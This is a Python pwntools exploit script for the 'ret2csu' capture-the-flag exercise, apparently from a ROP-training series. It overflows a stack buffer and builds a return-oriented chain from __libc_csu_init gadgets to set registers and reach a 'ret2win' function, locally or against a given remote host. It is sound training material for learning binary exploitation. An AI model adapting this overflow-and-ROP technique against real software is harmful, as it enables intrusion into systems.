#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './ret2csu'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000004008a3 # pop rdi ; ret
ret  = prdi + 1
m3c  = 0x00400880 
p6r  = 0x0040089a

'''
0x00400880      mov rdx, r15  
0x00400883      mov rsi, r14  
0x00400886      mov edi, r13d 
0x00400889      call qword [r12 + rbx*8]

0x0040088d      add rbx, 1         
0x00400891      cmp rbp, rbx       
0x00400894      jne 0x400880       
0x00400896      add rsp, 8         

0x0040089a      pop rbx 
0x0040089b      pop rbp 
0x0040089c      pop r12 
0x0040089e      pop r13 
0x004008a0      pop r14 
0x004008a2      pop r15 
0x004008a4      ret     
'''

fini_array = 0x600e18
# rop1
offset = 40
payload = 'A'*offset
payload += p64(p6r) + p64(0) + p64(1) + p64(fini_array) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)
payload += p64(m3c) + p64(0)*7
payload += p64(elf.sym['ret2win'])

debug()
sl(payload)

p.interactive()

